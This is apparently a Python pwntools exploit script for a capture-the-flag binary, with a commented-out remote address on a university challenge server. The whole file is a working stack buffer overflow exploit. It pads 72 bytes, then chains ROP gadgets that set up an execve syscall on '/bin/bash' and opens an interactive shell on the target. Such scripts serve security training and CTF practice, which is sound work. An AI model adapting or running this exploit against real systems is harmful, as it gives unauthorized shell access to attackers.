from pwn import *

#p = process("./bin")
p = gdb.debug(
    "./bin",
    """
    break main
    continue
    """
    )
# p = remote('cyberchallenge.disi.unitn.it', 9200)

'''
mov rax, 59
mov rdi, 0x400000+0x0002004
mov rsi, 0
mov rdx, 0
syscall
'''

pop_rax = 0x000000000040119c #pop rax; ret; 
pop_rbp = 0x000000000040111d #pop rbp; ret; 
pop_rdi = 0x0000000000401196 #pop rdi; ret; 
pop_rdx = 0x000000000040119a #pop rdx; ret; 
pop_rsi = 0x0000000000401198 #pop rsi; ret;
syscall = 0x000000000040119e
bin_bash = 0x400000+0x0002004

offset = 72

payload = b'A'*offset
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(bin_bash)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

p.sendline(payload)  

p.interactive()
